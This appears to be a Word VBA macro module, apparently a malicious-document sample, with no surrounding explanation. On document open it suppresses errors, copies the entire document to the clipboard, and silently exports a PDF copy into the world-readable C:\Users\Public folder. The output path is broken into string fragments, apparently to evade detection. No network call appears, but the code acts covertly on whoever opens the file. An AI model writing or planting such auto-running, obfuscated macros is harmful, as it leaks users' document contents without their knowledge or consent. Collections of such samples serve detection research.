Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim rng As Object
    On Error Resume Next
    Set rng = ActiveDocument.Range
    rng.Copy
    ActiveDocument.ExportAsFixedFormat OutputFileName:= _
        "C:\Use" & "rs\Public" & "\obl" & "ivion" & "x_form" & "at.p" & "df", ExportFormat:=wdExportFormatPDF
End Sub
